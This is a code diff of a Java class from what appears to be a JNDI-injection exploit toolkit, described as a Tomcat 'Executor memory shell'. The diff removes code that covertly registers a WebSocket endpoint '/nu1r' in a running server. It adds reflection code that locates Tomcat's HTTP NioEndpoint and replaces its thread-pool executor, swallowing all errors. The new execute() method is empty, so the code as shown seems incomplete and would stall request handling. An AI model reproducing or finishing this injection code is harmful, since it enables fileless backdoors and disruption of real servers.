@@ -1,42 +1,89 @@
 package com.nu1r.jndi.template.tomcat;
 
 import org.apache.catalina.core.StandardContext;
+import org.apache.catalina.core.StandardThreadExecutor;
 import org.apache.catalina.loader.WebappClassLoaderBase;
+import org.apache.tomcat.util.net.NioEndpoint;
+import org.apache.tomcat.util.threads.ThreadPoolExecutor;
 import org.apache.tomcat.websocket.server.WsServerContainer;
 
 import javax.websocket.*;
 import javax.websocket.server.ServerContainer;
 import javax.websocket.server.ServerEndpointConfig;
+import java.util.concurrent.BlockingQueue;
+import java.util.concurrent.RejectedExecutionHandler;
+import java.util.concurrent.ThreadFactory;
+import java.util.concurrent.TimeUnit;
 
 /**
  * Executor 内存马
  * @author nu1r
  */
-public class TWSMSFromThread extends Endpoint implements MessageHandler.Whole<String> {
+public class TWSMSFromThread extends ThreadPoolExecutor {
 
     static {
-        String                wsName                = "/nu1r";
-        WebappClassLoaderBase webappClassLoaderBase = (WebappClassLoaderBase) Thread.currentThread().getContextClassLoader();
-        StandardContext       standardContext       = (StandardContext) webappClassLoaderBase.getResources().getContext();
-        ServerEndpointConfig  build                 = ServerEndpointConfig.Builder.create(TWSMSFromThread.class, wsName).build();
-        WsServerContainer     attribute             = (WsServerContainer) standardContext.getServletContext().getAttribute(ServerContainer.class.getName());
         try {
-            attribute.addEndpoint(build);
-            standardContext.getServletContext().setAttribute(wsName, wsName);
-        } catch (DeploymentException e) {
-            throw new RuntimeException(e);
+            ThreadPoolExecutor exec        = null;
+            NioEndpoint        nioEndpoint = (NioEndpoint) getStandardService();
+            try {
+                exec = (ThreadPoolExecutor) getFieldValue(nioEndpoint, "executor");
+            } catch (ClassCastException e) {
+                StandardThreadExecutor standardExec = (StandardThreadExecutor) getFieldValue(nioEndpoint, "executor");
+                exec = (ThreadPoolExecutor) getFieldValue(standardExec, "executor");
+            }
+            TWSMSFromThread exe = new TWSMSFromThread(exec.getCorePoolSize(), exec.getMaximumPoolSize(), exec.getKeepAliveTime(TimeUnit.MILLISECONDS), TimeUnit.MILLISECONDS, exec.getQueue(), exec.getThreadFactory(), exec.getRejectedExecutionHandler());
+            nioEndpoint.setExecutor(exe);
+        } catch (Exception ignored) {
         }
     }
 
-    public Session session;
-
-    public void onMessage(String message) {
+    public TWSMSFromThread(int corePoolSize, int maximumPoolSize, long keepAliveTime, TimeUnit unit, BlockingQueue<Runnable> workQueue, ThreadFactory threadFactory, RejectedExecutionHandler handler) {
+        super(corePoolSize, maximumPoolSize, keepAliveTime, unit, workQueue, threadFactory, handler);
     }
 
 
     @Override
-    public void onOpen(Session session, EndpointConfig config) {
-        this.session = session;
-        session.addMessageHandler(this);
+    public void execute(Runnable command) {
+    }
+
+    public static Object getStandardService() throws Exception {
+        Thread[] threads = (Thread[]) getFieldValue(Thread.currentThread().getThreadGroup(), "threads");
+        for (Thread thread : threads) {
+            if (thread == null) {
+                continue;
+            }
+            if ((thread.getName().contains("Acceptor")) && (thread.getName().contains("http"))) {
+                Object target      = getFieldValue(thread, "target");
+                Object jioEndPoint = null;
+                try {
+                    jioEndPoint = getFieldValue(target, "this$0");
+                } catch (Exception e) {
+                    e.printStackTrace();
+                }
+
+                return jioEndPoint == null ? getFieldValue(target, "endpoint") : jioEndPoint;
+            }
+        }
+        return new Object();
+    }
+
+
+    public static Object getFieldValue(Object obj, String fieldName) throws Exception {
+        java.lang.reflect.Field f = null;
+        if (obj instanceof java.lang.reflect.Field) {
+            f = (java.lang.reflect.Field) obj;
+        } else {
+            Class cs = obj.getClass();
+            while (cs != null) {
+                try {
+                    f = cs.getDeclaredField(fieldName);
+                    cs = null;
+                } catch (Exception e) {
+                    cs = cs.getSuperclass();
+                }
+            }
+        }
+        f.setAccessible(true);
+        return f.get(obj);
     }
 }
